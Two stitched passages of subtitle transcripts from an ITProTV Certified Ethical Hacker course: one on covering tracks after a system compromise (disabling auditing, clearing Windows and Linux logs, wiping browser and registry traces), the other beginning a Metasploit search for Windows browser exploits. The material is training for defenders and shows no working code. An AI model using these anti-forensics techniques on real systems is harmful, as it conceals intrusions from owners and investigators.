01:02:55.320\nLooking to gain advantage\nagainst the bad actor.\n\n1287\n01:02:55.320 --> 01:02:57.040\nTrying to figure this stuff out and and\n\n1288\n01:02:57.040 --> 01:03:00.200\ntrying to figure out how we can then\ndetect that this has been done.\n\n1289\n01:03:00.200 --> 01:03:02.890\nSo, just wanna keep that in mind and\nthink about that.\n\n1290\n01:03:02.890 --> 01:03:04.710\nAnd finally, of course closing up,\n\n1291\n01:03:04.710 --> 01:03:06.600\nbecause I know that I've\nbeen talking way too long.\n\n1292\n01:03:06.600 --> 01:03:08.260\nThe red lights and\nthe people with the hoods and\n\n1293\n01:03:08.260 --> 01:03:12.706\nthe nets are coming to get me right\nhere at the outside of the studio door.\n\n1294\n01:03:12.706 --> 01:03:16.170\nWe want to make sure we've talked about\nthe very last stage in this process,\n\n1295\n01:03:16.170 --> 01:03:19.510\nwhich is making sure we're covering\nour tracks, and making sure that for\n\n1296\n01:03:19.510 --> 01:03:22.560\nall the kind of stuff we've been talking\nabout, we know that we have to go in and\n\n1297\n01:03:22.560 --> 01:03:25.840\nremove any evidence of the attacks\nthat may have happened.\n\n1298\n01:03:25.840 --> 01:03:26.786\nIf we're the bad actor, that's our goal.\n\n1299\n01:03:26.786 --> 01:03:29.713\nIf we're doing a Pen Test, and\nwe're the person who's the CEH with,\n\n1300\n01:03:29.713 --> 01:03:32.548\ntrying to cover our tracks and\nmake it appear as if we were not there.\n\n1301\n01:03:32.548 --> 01:03:36.370\nSo we want to go in, obviously\nthink about removing log files or\n\n1302\n01:03:36.370 --> 01:03:39.615\nmodifying them,\ndisable auditing on the system, so\n\n1303\n01:03:39.615 --> 01:03:42.950\nuse a good tool like AuditPol\nto list the audit policy.\n\n1304\n01:03:42.950 --> 01:03:46.580\nHyena's a good one, Hyena shows us\nthat as well, we talked about that.\n\n1305\n01:03:46.580 --> 01:03:49.090\nWe'll try to disable\nauditing on our way in,\n\n1306\n01:03:49.090 --> 01:03:52.370\nprevent activity from being recorded so\nthat you don't know we were there.\n\n1307\n01:03:52.370 --> 01:03:55.830\nWe'll try to disable logging, so we'll\ngo out and we'll leave a clear logs or\n\n1308\n01:03:55.830 --> 01:03:57.285\nstop logging from happening.\n\n1309\n01:03:57.285 --> 01:04:02.220\nClearlogs.exe is a simply log tool that\nwill go out and allow us to do that.\n\n1310\n01:04:02.220 --> 01:04:06.660\nWe can use Metasploit, which we'll see\ncoming up in some of the demos, to be able\n\n1311\n01:04:06.660 --> 01:04:10.220\nto go ahead and create a package\nwhere we can actually then go out and\n\n1312\n01:04:10.220 --> 01:04:13.030\nzap the log files through Metasploit,\nthrough the framework.\n\n1313\n01:04:13.030 --> 01:04:16.930\nSo we can do that, we can manually go\nclear the event logs when all else fails,\n\n1314\n01:04:16.930 --> 01:04:20.120\ngo in there, right click and\ndelete, so we could do that.\n\n1315\n01:04:20.120 --> 01:04:22.590\nAnd obviously, in Windows and\non Linux both, we could do that.\n\n1316\n01:04:22.590 --> 01:04:23.380\nRemember, in Linux,\n\n1317\n01:04:23.380 --> 01:04:25.720\nwe're gonna go to a different\ndirectory than we would in Windows.\n\n1318\n01:04:25.720 --> 01:04:27.659\nIn Windows,\nwe're going into the Event Viewer.\n\n1319\n01:04:27.659 --> 01:04:31.314\nWe're going into Windows System 32,\nand going through the logs.\n\n1320\n01:04:31.314 --> 01:04:33.908\nIn Linux it's gonna be\nthe var log directory.\n\n1321\n01:04:33.908 --> 01:04:36.110\nIn most distributions\nwe're gonna go there.\n\n1322\n01:04:36.110 --> 01:04:40.395\nAnd we're then gonna go in, and\nif we wanna look at the logs,\n\n1323\n01:04:40.395 --> 01:04:43.560\nvar log messages and see what's listed.\n\n1324\n01:04:43.560 --> 01:04:44.930\nBut we might just go into var log and\n\n1325\n01:04:44.930 --> 01:04:47.805\nstart hacking away at all the files\nwe find there to get rid of them.\n\n1326\n01:04:47.805 --> 01:04:49.650\n>> Mm-hm.\n>> Noe this assumes that we're not\n\n1327\n01:04:49.650 --> 01:04:53.840\ntransporting these logs off of the machine\nand we're not using a SIM system or\n\n1328\n01:04:53.840 --> 01:04:57.500\na syslog server, you know, whatever we\nmay do to remotely capture that and\n\n1329\n01:04:57.500 --> 01:04:58.830\nessentially manage it.\n\n1330\n01:04:58.830 --> 01:05:03.210\nIf we are clearing the logs locally, its\nnot gonna be the only thing we gotta do.\n\n1331\n01:05:03.210 --> 01:05:05.680\nSo, now we gotta go\nhack the SEM system and\n\n1332\n01:05:05.680 --> 01:05:09.580\nget the logs that have been recorded that\nshow all the activity that were going on.\n\n1333\n01:05:09.580 --> 01:05:12.400\nSo the smart defender, the CEH,\n\n1334\n01:05:12.400 --> 01:05:15.940\nis gonna be thinking about implementing\na central log management system\n\n1335\n01:05:15.940 --> 01:05:19.940\nto prevent a single attack against\na machine from being hidden.\n\n1336\n01:05:19.940 --> 01:05:22.530\nBecause the log files have been removed\nand we don't have any knowledge of it.\n\n1337\n01:05:22.530 --> 01:05:25.560\nWhich can also be an issue and\nwe have to think about that as well.\n\n1338\n01:05:25.560 --> 01:05:28.650\nSo ways to do that,\nwe could do privacy settings and\n\n1339\n01:05:28.650 --> 01:05:32.540\nremove privacy settings and get rid\nof caches, cookies, things like that.\n\n1340\n01:05:32.540 --> 01:05:35.940\nIf we've been out,\nI love it when attackers sit down and\n\n1341\n01:05:35.940 --> 01:05:37.310\nthey go surfing on the web.\n\n1342\n01:05:37.310 --> 01:05:38.500\nYou know, and they're checking email.\n\n1343\n01:05:38.500 --> 01:05:40.290\nI mean we find such stupid stuff.\n\n1344\n01:05:40.290 --> 01:05:44.680\nLike somebody has attacked the box and\nthey're not smart enough to go and\n\n1345\n01:05:44.680 --> 01:05:48.050\ncheck their email from their own system,\nthey're in the hacked system.\n\n1346\n01:05:48.050 --> 01:05:51.210\nAnd I can just imagine, they're sitting\nthere and somebody sends them, and\n\n1347\n01:05:51.210 --> 01:05:52.880\nthere's this great new thing,\nand they go and they open it.\n\n1348\n01:05:52.880 --> 01:05:54.020\nTarget system they hacked.\n\n1349\n01:05:54.020 --> 01:05:56.520\nAnd then we got their e-mail\ninformation forensically.\n\n1350\n01:05:56.520 --> 01:05:58.530\nWe know who this guy or this girl is.\n\n1351\n01:05:58.530 --> 01:05:59.150\nI've seen, I mean,\n\n1352\n01:05:59.150 --> 01:06:02.940\nas stupid as that sounds, I've actually\nseen this stuff happen before.\n\n1353\n01:06:02.940 --> 01:06:06.200\nWe've got to get rid of all the MRU\ndata right in the caches, so\n\n1354\n01:06:06.200 --> 01:06:08.370\nclear out IE, right, do all that stuff.\n\n1355\n01:06:08.370 --> 01:06:09.450\nSame thing in Google.\n\n1356\n01:06:09.450 --> 01:06:10.960\nSame thing in Firefox.\n\n1357\n01:06:10.960 --> 01:06:14.410\nWhen I do this kind of stuff I dont\nuse those browsers by the way, right.\n\n1358\n01:06:14.410 --> 01:06:17.190\nI use secure browsers I use\na Tor Browser something like that.\n\n1359\n01:06:17.190 --> 01:06:19.660\nThat's not gonna leave behind anything.\n\n1360\n01:06:19.660 --> 01:06:22.350\nWe talked about the limits\nfought the limits.\n\n1361\n01:06:22.350 --> 01:06:24.205\nThe limits operating system I think,\nright.\n\n1362\n01:06:24.205 --> 01:06:25.000\n>> Uh-huh.\n>> I wanna pair opposites,\n\n1363\n01:06:25.000 --> 01:06:27.960\nwhere the set essentially boots\nright off of a thumb drive, and\n\n1364\n01:06:27.960 --> 01:06:28.860\ndoes not leave a footprint.\n\n1365\n01:06:28.860 --> 01:06:30.370\nThere's all these different stuff.\n\n1366\n01:06:30.370 --> 01:06:32.150\nGo into the registry in Windows, right?\n\n1367\n01:06:32.150 --> 01:06:37.190\nGo into HTCU software, Microsoft Windows,\ncurrent version of Explorer, and\n\n1368\n01:06:37.190 --> 01:06:38.500\nthen clear that registry key.\n\n1369\n01:06:38.500 --> 01:06:40.570\nAll the recent docs and\neverything will be there.\n\n1370\n01:06:40.570 --> 01:06:43.420\nDelete all the values out and you've\ngotten rid of all the stuff that will show\n\n1371\n01:06:43.420 --> 01:06:45.340\nup in the menus and things like that.\n\n1372\n01:06:45.340 --> 01:06:46.630\nWant me to go through that one more time?\n\n1373\n01:06:46.630 --> 01:06:47.170\n>> Nope we're good.\n\n1374\n01:06:47.170 --> 01:06:47.743\n>> You got that one?\n\n1375\n01:06:47.743 --> 01:06:48.463\nOkay.\nJust so\n\n1376\n01:06:48.463 --> 01:06:51.001\nwe know, so all those kind of toools,\nall those kind of things,\n\n1377\n01:06:51.001 --> 01:06:52.950\nall those thought processes, right?\n\n1378\n01:06:52.950 --> 01:06:55.985\nWe want to go in and get rid of all that\ndata that's sitting there because if we\n\n1379\n01:06:55.985 --> 01:06:59.490\ndon't, then obviously when we come in,\nright, after the fact.\n\n1380\n01:06:59.490 --> 01:07:00.570\nWe can look and we can say,\n\n1381\n01:07:00.570 --> 01:07:02.950\nlook Mike's been here, trolling\n>> Mm-hm.\n\n1382\n01:07:02.950 --> 01:07:04.070\n>> Around and looking for stuff.\n\n1383\n01:07:04.070 --> 01:07:04.960\nOr who knows what, right?\n\n1384\n01:07:04.960 --> 01:07:06.910\nBut that's gonna be important as well.\n\n1385\n01:07:06.910 --> 01:07:11.490\n>> All right Adam, a great look there as\nwe've rounded out our conversation on\n\n1386\n01:07:11.490 --> 01:07:13.990\nsystem hacking, talking about\nsome of the different techniques.\n\n1387\n01:07:13.990 --> 01:07:17.110\nLook at a really good demonstration\non our alternate data streams,\n\n1388\n01:07:17.110 --> 01:07:18.710\nand kinda rounding things off with-\n>> [INAUDIBLE]\n\n1389\n01:07:18.710 --> 01:07:20.200\n>> That was good.\n\n1390\n01:07:20.200 --> 01:07:24.250\nAnd then rounding things off talking about\nthat last part covering your tracks,\n\n1391\n01:07:24.250 --> 01:07:27.210\nobviously as a bad guy that's what\nthey're gonna be trying to do.\n\n1392\n01:07:27.210 --> 01:07:29.650\nWe've gotta understand how\nthey're going about doing that so\n\n1393\n01:07:29.650 --> 01:07:31.160\nthat we can prevent them from doing it.\n\n1394\n01:07:31.160 --> 01:07:32.630\n>> So we appreciate that.\n\n1395\n01:07:32.630 --> 01:07:34.800\nHope everybody out there enjoyed watching.\n\n1396\n01:07:34.800 --> 01:07:37.660\nSigning off for It Pro Tv,\nI'm Mike Roderick.\n\n1397\n01:07:37.660 --> 01:07:38.460\n>> I'm Adam Gordon.\n\n1398\n01:07:38.460 --> 01:07:41.900\n>> And we'll see you next time.\n\n",

00:00:16.984\n>> Let's run some stuff out\nthere from time to time.\n\n4\n00:00:16.984 --> 00:00:18.887\n>> [LAUGH] I must have been\nrunning my pop up blocker.\n\n5\n00:00:18.887 --> 00:00:21.902\n>> [CROSSTALK]\n>> Be like totally random.\n\n6\n00:00:21.902 --> 00:00:25.404\n>> [LAUGH] Anyway, welcome to another\nexciting episode here at ITProTV.\n\n7\n00:00:25.404 --> 00:00:26.967\nI'm your host, Mike Rodrick.\n\n8\n00:00:26.967 --> 00:00:30.460\nAnd today, we're doing our\nCertified Ethical Hacker, version 9.\n\n9\n00:00:30.460 --> 00:00:34.160\nAnd specifically in this episode,\nwe're gonna be looking at system hacking.\n\n10\n00:00:34.160 --> 00:00:37.780\nWe've been talking a lot about system\nhacking, done a couple episodes on that.\n\n11\n00:00:37.780 --> 00:00:39.670\nWe've done a couple demos for you.\n\n12\n00:00:39.670 --> 00:00:42.840\nAnd we're gonna do more demos cuz we\nknow you guys like demos out there.\n\n13\n00:00:42.840 --> 00:00:46.010\nSo here to show us the way is Mr.\nAdam Gordon.\n\n14\n00:00:46.010 --> 00:00:47.050\nHow're you doing, Adam?\n\n15\n00:00:47.050 --> 00:00:48.025\n>> How funny, I'm doing well.\n\n16\n00:00:48.025 --> 00:00:51.550\nShow me where do you come up with\nthis stuff, show me the way.\n\n17\n00:00:51.550 --> 00:00:55.604\n>> Well, ever since our other class, you\ngot tired of me saying the same old thing\n\n18\n00:00:55.604 --> 00:00:58.790\nover and over, so I tried to\nspice it up for you a little bit.\n\n19\n00:00:58.790 --> 00:00:59.910\n>> Thank you, I appreciate that.\n\n20\n00:00:59.910 --> 00:01:01.990\nYou're just so good to me.\n\n21\n00:01:01.990 --> 00:01:02.760\n>> I do what I can.\n\n22\n00:01:02.760 --> 00:01:04.850\n>> I got you nothing, I feel horrible.\n\n23\n00:01:04.850 --> 00:01:08.210\nAll right, anyway, so we're going to show\nyou the way, as Mike was indicating.\n\n24\n00:01:08.210 --> 00:01:12.252\nSo we are going to, in just a second or\ntwo, jump over to the demo environment,\n\n25\n00:01:12.252 --> 00:01:14.972\ngot some interesting stuff\nwe're gonna do for you.\n\n26\n00:01:14.972 --> 00:01:17.450\nWe've already done a few\ndemos as Mike pointed out.\n\n27\n00:01:17.450 --> 00:01:21.460\nWe did a pretty extensive\ndiscussion in the last episode on\n\n28\n00:01:21.460 --> 00:01:22.830\nalternate data streams.\n\n29\n00:01:22.830 --> 00:01:26.109\nWe talked a little bit about that,\ntalked about how you might find root kits,\n\n30\n00:01:26.109 --> 00:01:27.219\ndid a little demo on that,\n\n31\n00:01:27.219 --> 00:01:31.070\ndid a little comparison of the file output\nfrom the list with directory command.\n\n32\n00:01:31.070 --> 00:01:34.082\nAnd I thought the PowerShell thing\nwe talked about was kind of cool\n\n33\n00:01:34.082 --> 00:01:37.913\nwith the whole ADS thing, so that was kind\nof neat, knowing that we can now actually\n\n34\n00:01:37.913 --> 00:01:40.912\npotentially find alternative\ndata streams using PowerShell.\n\n35\n00:01:40.912 --> 00:01:44.378\nOf course, that would imply you'd have\nto go out and actually learn PowerShell,\n\n36\n00:01:44.378 --> 00:01:44.890\nI suppose.\n\n37\n00:01:44.890 --> 00:01:51.010\nBut hey, listen, the life of a CH, one of\nconstant, constant turmoil and education.\n\n38\n00:01:51.010 --> 00:01:51.680\nThat's the good news.\n\n39\n00:01:51.680 --> 00:01:54.537\nSo we're gonna go ahead, we're gonna\ntry to apply some of that conversation,\n\n40\n00:01:54.537 --> 00:01:56.901\nsome of the things we've been\ntalking about in the environment.\n\n41\n00:01:56.901 --> 00:02:00.003\nOne of the new things we're gonna take\na look at here in a minute that we haven't\n\n42\n00:02:00.003 --> 00:02:02.306\ndone yet, we've been in\nKali Linux fairly extensively,\n\n43\n00:02:02.306 --> 00:02:03.880\nalmost every time we do a demo.\n\n44\n00:02:03.880 --> 00:02:05.920\nTry to throw some Windows and\nsome Linux in there for\n\n45\n00:02:05.920 --> 00:02:07.970\nyou, get a little balance between the two.\n\n46\n00:02:07.970 --> 00:02:12.090\nAnd so we're actually gonna switch it\nup even more, because you're going to,\n\n47\n00:02:12.090 --> 00:02:15.792\nshould I wait for while you like play\nyour news clip, or whatever that?\n\n48\n00:02:15.792 --> 00:02:16.433\n>> That's you.\n\n49\n00:02:16.433 --> 00:02:17.475\n[LAUGH]\n>> That's me?\n\n50\n00:02:17.475 --> 00:02:18.078\n>> Exactly, you, yes.\n\n51\n00:02:18.078 --> 00:02:20.410\n>> Could I talk,\nwe could have stereo going, right?\n\n52\n00:02:21.570 --> 00:02:25.154\nSo what I'm actually gonna do as well,\nwhich is brand new here for\n\n53\n00:02:25.154 --> 00:02:29.324\nme at ITProTV in all the time I've been\nhere, except that it just timed out,\n\n54\n00:02:29.324 --> 00:02:33.168\nis that we're gonna go ahead, and\nwe're actually going to not only do\n\n55\n00:02:33.168 --> 00:02:37.118\nthat demo for you, but actually gonna\ndo it off of Mike's Mac Airbook.\n\n56\n00:02:37.118 --> 00:02:41.100\nSo we're gonna actually take a look\nat that and have me working on that.\n\n57\n00:02:41.100 --> 00:02:46.520\nCan you do me a favor, and could we go\nto my, who, how are we gonna do this?\n\n58\n00:02:46.520 --> 00:02:48.190\nActually, all right,\njust give me a second.\n\n59\n00:02:48.190 --> 00:02:50.045\nWell, I'm-\n>> You get the machines,\n\n60\n00:02:50.045 --> 00:02:50.840\nI get the browser, yep.\n\n61\n00:02:50.840 --> 00:02:54.745\n>> And more importantly, nothing over\nhere, timed out, so I think I just need\n\n62\n00:02:54.745 --> 00:02:58.820\nyour, so no, I got it figured,\ntake it back, tell them to take it back.\n\n63\n00:02:58.820 --> 00:02:59.798\nHad I moved the mouse,\nit would have worked.\n\n64\n00:02:59.798 --> 00:03:01.290\nI forgot to put a mouse on there.\n\n65\n00:03:01.290 --> 00:03:02.740\nI'm hitting the touch pad,\nnothing's happening.\n\n66\n00:03:02.740 --> 00:03:05.450\nI was just gonna have Mike come over and\njust get back into the console first.\n\n67\n00:03:05.450 --> 00:03:07.260\nWe're gonna go into his\nmachine in just a minute.\n\n68\n00:03:07.260 --> 00:03:08.320\nWe swap machines.\n\n69\n00:03:08.320 --> 00:03:09.975\nBut I'm gonna do the demo\nright off of his machine.\n\n70\n00:03:09.975 --> 00:03:13.870\nThought we'd swap it up a little bit for\nyou, but we've been in Kali.\n\n71\n00:03:13.870 --> 00:03:15.650\nBut what we haven't done yet\nis use Metasploit.\n\n72\n00:03:15.650 --> 00:03:18.730\nAnd so we're actually gonna go in, take\na look at Metasploit, which is, in and\n\n73\n00:03:18.730 --> 00:03:22.310\nof itself, a massive hacking database and\n\n74\n00:03:22.310 --> 00:03:26.500\nhacking toolset that we can use for good,\nbut as we've also talked about, for evil.\n\n75\n00:03:26.500 --> 00:03:29.109\nSo we're gonna show you some of the\nbackend stuff that hackers are doing that\n\n76\n00:03:29.109 --> 00:03:30.925\nyou're gonna potentially\nhave to defend against.\n\n77\n00:03:30.925 --> 00:03:35.304\nAnd show you how Metasploit can be used to\ncreate essentially attack packages that\n\n78\n00:03:35.304 --> 00:03:38.794\ncould be used to exploit, or\nin this case, take over a machine and\n\n79\n00:03:38.794 --> 00:03:42.995\nallow us to gain control and potentially\ndo an exploit to escalate privilege.\n\n80\n00:03:42.995 --> 00:03:44.514\nGet the machine to connect and\n\n81\n00:03:44.514 --> 00:03:48.260\nactually allow us to have a VNC session\nwithout having to authenticate.\n\n82\n00:03:48.260 --> 00:03:51.101\nI'm gonna actually show you how to\nessentially hack a Windows 7 machine\n\n83\n00:03:51.101 --> 00:03:52.743\nfrom Linux, in other words-\n>> Wow.\n\n84\n00:03:52.743 --> 00:03:53.300\n>> And do that.\n\n85\n00:03:53.300 --> 00:03:57.671\nAnd then when I'm done, if I have any time\nleft, Mike's gonna do a soft tap shoe for\n\n86\n00:03:57.671 --> 00:04:00.330\nus here in the studio and show you how he-\n>> [LAUGH]\n\n87\n00:04:00.330 --> 00:04:01.620\n>> Is able to keep time.\n\n88\n00:04:01.620 --> 00:04:04.247\nAll right, so let's move over here\nto the lab environment if we could.\n\n89\n00:04:04.247 --> 00:04:05.850\nWe're gonna go ahead and bring that up.\n\n90\n00:04:05.850 --> 00:04:06.800\nAnd we're gonna get started.\n\n91\n00:04:06.800 --> 00:04:09.680\nI'm just gonna log back into the Kali box.\n\n92\n00:04:11.200 --> 00:04:14.030\nGet back on here, since we timed out.\n\n93\n00:04:14.030 --> 00:04:17.710\nOf course,\nit would help if I could type properly.\n\n94\n00:04:17.710 --> 00:04:20.880\nI'm not used to your fancy keyboard here.\n\n95\n00:04:20.880 --> 00:04:25.620\nThat coordi layout that that Apple machine\nuses, as opposed to my Windows machine.\n\n96\n00:04:25.620 --> 00:04:28.084\nIt chooses the same layout for\nthose of you that don't know any better.\n\n97\n00:04:28.084 --> 00:04:32.600\nAll right, so we're here and I already\ntook the liberty of loading up Metasploit.\n\n98\n00:04:32.600 --> 00:04:35.310\nAnd just because it takes a couple of\nminutes the first time you load it,\n\n99\n00:04:35.310 --> 00:04:39.880\nto go out and actually load the system,\nload the services, build the console,\n\n100\n00:04:39.880 --> 00:04:42.610\nget everything up and running, I figured\nit wasn't worth watching all that happen.\n\n101\n00:04:42.610 --> 00:04:44.792\nYou can watch that on your own,\nso I had Metasploit loaded.\n\n102\n00:04:44.792 --> 00:04:48.419\n>> And if you guys need to know how, we've\ngot videos in our course library that\n\n103\n00:04:48.419 --> 00:04:52.250\ncover Kali and Metasploit, so you can\nfigure out how to load it up there.\n\n104\n00:04:52.250 --> 00:04:53.370\n>> And it's very similar.\n\n105\n00:04:53.370 --> 00:04:55.387\nDo you see me go in with\nthe app browser and\n\n106\n00:04:55.387 --> 00:04:57.830\njust simply type in the name\nof whatever app we want.\n\n107\n00:04:57.830 --> 00:04:58.410\nIt is loaded.\n\n108\n00:04:58.410 --> 00:05:00.360\nOne of the reasons we're using Kali for\n\n109\n00:05:00.360 --> 00:05:03.500\nall of this is that all these tools\nare already loaded in Kali, which is nice,\n\n110\n00:05:03.500 --> 00:05:07.710\nand that's one of the reasons we like\nthis Linux distribution so much.\n\n111\n00:05:07.710 --> 00:05:08.910\nPlus it's fun to say.\n\n112\n00:05:08.910 --> 00:05:09.574\n>> It is.\n>> Kali.\n\n113\n00:05:09.574 --> 00:05:10.681\n>> Kali.\n>> Kali.\n\n114\n00:05:10.681 --> 00:05:11.274\n>> Or Kali.\n\n115\n00:05:11.274 --> 00:05:12.068\n>> Or Kali.\n\n116\n00:05:12.068 --> 00:05:15.020\n>> Yeah,\nthat would be like the Indiana Jones.\n\n117\n00:05:15.020 --> 00:05:17.523\n>> Well, supposedly that's what\nit's actually named after,\n\n118\n00:05:17.523 --> 00:05:18.590\nwas that god or goddess.\n\n119\n00:05:18.590 --> 00:05:21.130\nSo I think I pronounce\nit wrong all the time.\n\n120\n00:05:21.130 --> 00:05:24.133\n>> You very well may, but\nthen again, you may not.\n\n121\n00:05:24.133 --> 00:05:24.812\nMaybe everybody else is wrong.\n\n122\n00:05:24.812 --> 00:05:25.354\n>> Exactly.\n\n123\n00:05:25.354 --> 00:05:25.966\n>> And you were right.\n\n124\n00:05:25.966 --> 00:05:27.386\n>> [LAUGH]\n>> Believe in yourself, Mike,\n\n125\n00:05:27.386 --> 00:05:29.180\nthat's what's important,\nbelieve in yourself.\n\n126\n00:05:29.180 --> 00:05:32.050\nEven if evidence to the contrary arises,\nbelieve in yourself.\n\n127\n00:05:32.050 --> 00:05:33.560\nSo, we're in here.\n\n128\n00:05:33.560 --> 00:05:35.700\nAnd all we did was simply\njust type in Metasploit, or\n\n129\n00:05:35.700 --> 00:05:37.750\nI just typed it in the search bar up top.\n\n130\n00:05:37.750 --> 00:05:40.870\nWe can launch it, actually have a little\nshortcut pegged to the nav bar on the left\n\n131\n00:05:40.870 --> 00:05:41.990\nto launch it as well.\n\n132\n00:05:41.990 --> 00:05:44.668\nBut either way, you can certainly go in,\nyou can see it, no trouble, easy to load.\n\n133\n00:05:44.668 --> 00:05:49.114\nWhat we're gonna do is go out and\ndo a little recon, we're gonna go out and\n\n134\n00:05:49.114 --> 00:05:52.295\ndo a little searching of\nthe Metasploit framework.\n\n135\n00:05:52.295 --> 00:05:56.690\nWe've got what,\n1,500 exploits loaded right now.\n\n136\n00:05:56.690 --> 00:05:57.520\nSo we got quite a few.\n\n137\n00:05:57.520 --> 00:05:58.580\nWe've gotta do a little searching.\n\n138\n00:05:58.580 --> 00:06:01.417\nWe're using version 4.11.5 dash, woo,\n\n139\n00:06:01.417 --> 00:06:04.590\na whole big string of letters and\nnumbers up there.\n\n140\n00:06:04.590 --> 00:06:07.352\nBut if we're using a relatively recent\nbuild, this is the most recent Kali build,\n\n141\n00:06:07.352 --> 00:06:08.865\nso it's gonna load\nthe most recent version.\n\n142\n00:06:08.865 --> 00:06:12.509\nWe're gonna go out and do a search, so the\nfirst command I entered there once I typed\n\n143\n00:06:12.509 --> 00:06:16.207\nit correctly, cuz I first typed search as\nserach, because I couldn't see anything\n\n144\n00:06:16.207 --> 00:06:19.198\non the console, until I actually was\nable to get it to be big enough.\n\n145\n00:06:19.198 --> 00:06:22.935\nSo once we type search the right way,\nwe're gonna type in search,\n\n146\n00:06:22.935 --> 00:06:26.730\nand we gotta type in, in this case,\nwhat we wanna search for.\n\n147\n00:06:26.730 --> 00:06:30.730\nI highlighted there ms11, I'm searching\nfor exploits that have ms in them, so\n\n148\n00:06:30.730 --> 00:06:33.440\nMicrosoft, right,\nanything with Microsoft in there.\n\n149\n00:06:33.440 --> 00:06:37.364\nSo you'll notice first time you do,\nif you've used Kali before,\n\n150\n00:06:37.364 --> 00:06:42.284\nthat it says module database cache not\nbuilt yet, in other words, just loaded it.\n\n151\n00:06:42.284 --> 00:06:45.455\nWe haven't loaded everything into memory,\nwe haven't pulled the whole database in.\n\n152\n00:06:45.455 --> 00:06:49.370\nWe've gotta go do the old fashioned,\nlet me search by hand, slow search.\n\n153\n00:06:49.370 --> 00:06:51.020\nSo it says hey,\nwe're gonna use slow search.\n\n154\n00:06:51.020 --> 00:06:52.060\nNo big deal.\nAll that means is,\n\n155\n00:06:52.060 --> 00:06:54.420\nit's gonna take you a little bit\nlonger to get an answer back.\n\n156\n00:06:54.420 --> 00:06:57.870\nSo we just pre-loaded this, so\nwe wouldn't be waiting around for three or\n\n157\n00:06:57.870 --> 00:07:00.690\nfour minutes while we were waiting\non the search to come back.\n\n158\n00:07:00.690 --> 00:07:04.640\nWe then do the search, we get matching\nmodules, and we just scroll down here.\n\n159\n00:07:04.640 --> 00:07:09.860\nAnd our matching modules come back,\nand we get whatever modules will load,\n\n160\n00:07:09.860 --> 00:07:12.750\nthere's probably about 11 or\n12 of them in there that are loaded.\n\n161\n00:07:12.750 --> 00:07:17.090\nThey give you about the kind of\nthe description of what it is, ms11.\n\n162\n00:07:17.090 --> 00:07:20.780\nWe're searching for\nthat string in the exploit description, so\n\n163\n00:07:20.780 --> 00:07:23.590\nanything with MS11 in it\nas a string will be found.\n\n164\n00:07:23.590 --> 00:07:26.810\nAnd the reason I did that is\nI'm looking specifically for\n\n165\n00:07:26.810 --> 00:07:30.845\nweb-based exploits against browsers and\nolder versions of Windows.\n\n166\n00:07:30.845 --> 00:07:34.529\nWe're gonna use a Windows 7 box,\ntarget it, and\n\n167\n00:07:34.529 --> 00:07:38.850\nuse an exploit that will be\na browser exploit for Windows.\n\n168\n00:07:38.850 --> 00:07:42.316\nThis module we're gonna use specifically\nis gonna allow us to go in and\n\n169\n00:07:42.316 --> 00:07:46.509\nessentially take advantage of a memory\ncorruption vulnerability in the web stack.\n\n170\n00:07:46.509 --> 00:07:48.598\nAnd so we pick one that we\nknow we can play with and\n\n171\n00:07:48.598 --> 00:07:50.906\nessentially we know it's\ngonna do certain things.\n\n172\n00:07:50.906 --> 00:07:54.076\nWhat hackers are doing out\nthere is they're going out and\n\n173\n00:07:54.076 --> 00:07:56.665\nsaying okay, we've done our recon, right?\n\n174\n00:07:56.665 --> 00:08:00.893\nWe've done our exploitation,\nwe've done our gathering We're in\n\n175\n00:08:00.893 --> 00:08:04.838\nthe exploitation phase, looking for\nthings we can attach to.\n\n176\n00:08:04.838 --> 00:08:06.563\nSo we've got these boxes.\n\n177\n00:08:06.563 --> 00:08:07.404\nWe've profiled them.\n\n178\n00:08:07.404 --> 00:08:10.668\nWe see we've got some Windows 7,\ngot some Windows 8,\n\n179\n00:08:10.668 --> 00:08:14.287\nmaybe some Server 2008 and\nwhat would be likely targets.\n\n180\n00:08:14.287 --> 00:08:16.955\nSo we know we could look at web browsers,\n\n181\n00:08:16.955 --> 00:08:20.568\nwe know we have IE 9,\nIE 10 whatever the case may be.\n\n182\n00:08:20.568 --> 00:08:25.160\nSo we can look for specific versions and\nwe may have some exploits there for\n\n183\n00:08:25.160 --> 00:08:29.996\nOffice I'm looking at ones for Excel\nlisted in this batch I just pulled back.\n\n184\n00:08:29.996 --> 00:08:32.379\nThe IE Explorer CSS recursive exploits,\n\n185\n00:08:32.379 --> 00:08:35.383\nwhich we're gonna use, so\nthere's a whole bunch.\n\n186\n00:08:35.383 --> 00:08:38.958\nWe would be looking as an attacker,\nthinking in our minds hey,\n\n187\n00:08:38.958 --> 00:08:40.246\nwhat can I do, right?\n\n188\n00:08:40.246 --> 00:08:40.971\nWhat's out there.\n\n189\n00:08:40.971 --> 00:08:42.119\n>> Hey, what can I do, right?\n\n190\n00:08:42.119 --> 00:08:44.808\n>> So what can I do and\nhave you cued it up on the whole\n\n191\n00:08:44.808 --> 00:08:45.541\n>> That whole or\n\n192\n00:08:45.541 --> 00:08:47.278\nhey what can I do what can I say.\n\n193\n00:08:47.278 --> 00:08:49.740\nHave you been keeping up on\nthe whole suit with Led Zeppelin?\n\n194\n00:08:49.740 --> 00:08:50.567\n>> No.\n\n195\n00:08:50.567 --> 00:08:54.257\n>> So they got nailed recently\nwith a whole bunch of copyright\n\n196\n00:08:54.257 --> 00:08:58.928\ninfringements suits cuz they People\nhave been claiming that essentially\n\n197\n00:08:58.928 --> 00:09:01.878\na lot of the music is\nactually kinda borrowed.\n\n198\n00:09:01.878 --> 00:09:02.558\n>> Really?\n\n199\n00:09:02.558 --> 00:09:06.602\n>> Without actually proper props,\nand of course proper credit.\n\n200\n00:09:06.602 --> 00:09:10.355\nAnd there, they've been dragged into\nwhile these are surviving members anyway.\n\n201\n00:09:10.355 --> 00:09:11.260\n>> I was just gonna say-\n>> You dragged\n\n202\n00:09:11.260 --> 00:09:13.023\nin the court cuz they're not\ndigging people up for this.\n\n203\n00:09:13.023 --> 00:09:15.233\nBut when they were dragged,\nthey've been dragged in the court.\n\n204\n00:09:15.233 --> 00:09:16.362\n>> All right.\n>> it's like a big.\n\n205\n00:09:16.362 --> 00:09:17.344\n>> [CROSSTALK]\n>> Is your duly statute of\n\n206\n00:09:17.344 --> 00:09:18.217\nlimitations on that again?\n\n207\n00:09:18.217 --> 00:09:19.694\n>> No.\n\n208\n00:09:19.694 --> 00:09:24.255\nAnd as the matter of fact Spring Code\nrecently in the last week I think when I\n\n209\n00:09:24.255 --> 00:09:29.187\nhadn't actually changed the law and\nchanged the penalties involved in what you\n\n210\n00:09:29.187 --> 